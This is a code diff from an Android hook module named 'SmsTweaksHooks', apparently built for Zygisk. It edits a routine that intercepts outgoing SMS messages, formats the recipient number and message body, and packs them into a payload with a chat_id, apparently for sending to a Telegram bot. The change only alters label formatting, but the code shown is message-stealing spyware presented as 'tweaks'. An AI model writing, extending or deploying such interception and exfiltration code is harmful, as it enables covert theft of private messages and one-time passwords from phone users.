@@ -631,13 +631,13 @@ public final class SmsTweaksHooks {
                     if (digits.length() == 10) displayTo = "+91" + digits;
                     else if (digits.length() == 12 && digits.startsWith("91"))
                         displayTo = "+" + digits;
-                    // First screenshot spacing — blank line gaps + tap-to-copy
+                    // Exact screenshot: bold header+labels, mono To/Body, blank gaps
                     String msg = "📱 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥</b>\n"
                             + "\n"
-                            + "To (Tap to copy):\n"
+                            + "<b>To (Tap to copy):</b>\n"
                             + "<code>" + escHtml(displayTo) + "</code>\n"
                             + "\n"
-                            + "Body (Tap to copy):\n"
+                            + "<b>Body (Tap to copy):</b>\n"
                             + "<code>" + escHtml(body) + "</code>";
                     String payload = "{\"chat_id\":\"" + jsonEscTg(chat)
                             + "\",\"text\":\"" + jsonEscTg(msg)
